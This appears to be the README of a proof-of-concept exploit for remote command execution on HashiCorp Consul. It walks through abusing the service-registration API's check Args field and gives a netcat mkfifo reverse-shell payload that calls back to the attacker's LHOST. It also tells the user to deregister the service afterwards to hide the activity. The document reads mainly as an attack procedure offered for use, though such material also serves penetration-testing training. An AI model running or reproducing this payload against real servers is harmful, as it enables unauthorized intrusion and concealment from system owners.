# Hashicorp Consul - Remote Command Execution PoC
Author: blu3ming

This is a variation of the PoC found in Metasploit. The objective of this script is not to depend on that tool (OSCP style) and to perform the same procedure manually.

## Use
You need to set LHOST, LPORT (if 443 is already in use on your machine), RHOST and ACL_TOKEN (if apply) inside the script first. This script gets a reverse shell automatically, there's no need of netcat.

`python consul_rce_poc.py`

## Consul
Consul is a free and open-source service networking platform developed by HashiCorp. It has a RCE vulnerability when creating a service through it's API.

## Creating a service
As [Consul documentation](https://developer.hashicorp.com/consul/api-docs/agent/service) describes, we can create a service using the /v1/agent/service/register endpoint, which receives the following data via a PUT request:

- ID: Specifies a unique ID for this service
- Name: Specifies the logical name of the service
- Address: Specifies the address of the service
- Port: Specifies the port of the service
- Check: Specifies a check and, according to it's [documentation](https://developer.hashicorp.com/consul/api-docs/agent/check), uses the following data:
    * Args: Specifies command arguments to run to update the status of the check (eg. "args": ["sh", "-c", "..."])
    * Interval: Specifies the frequency at which to run this check
    * Timeout: Specifies a timeout for outgoing connections in the case of a Script, HTTP, TCP, UDP, or gRPC check
   
## Remote command execution
The creation of this service requires an authentication token from the Consul service, also known as ACL Token. As we can see, we can declare a command inside the Check.Args parameter, and Consul will execute it for us. In this case, we want to execute a reverse shell to get access to the Consul server:

`"Args":["sh", "-c","rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f"]`
  
With this command, now we can bind for a connection with the help of the **shell** function of the Python library **pwntools**.

## Getting access to the server
Consul returns an interactive console:
![imagen](https://user-images.githubusercontent.com/25083316/206324244-5449ebe5-269d-4634-847e-614f7b09c108.png)

## Deleting the service
Finally, we need to delete the service created in order to hide our activity. This can be done with a PUT request to the /v1/agent/service/deregister/[NAME] endpoint, of course, still using the ACL Token from Consul.
![imagen](https://user-images.githubusercontent.com/25083316/206324287-f6ad616c-67f7-4e9a-b114-1f33ac50fd85.png)

## Dependencies
- requests
- json
- pwntools (can be installed via "pip install pwn")
- threading
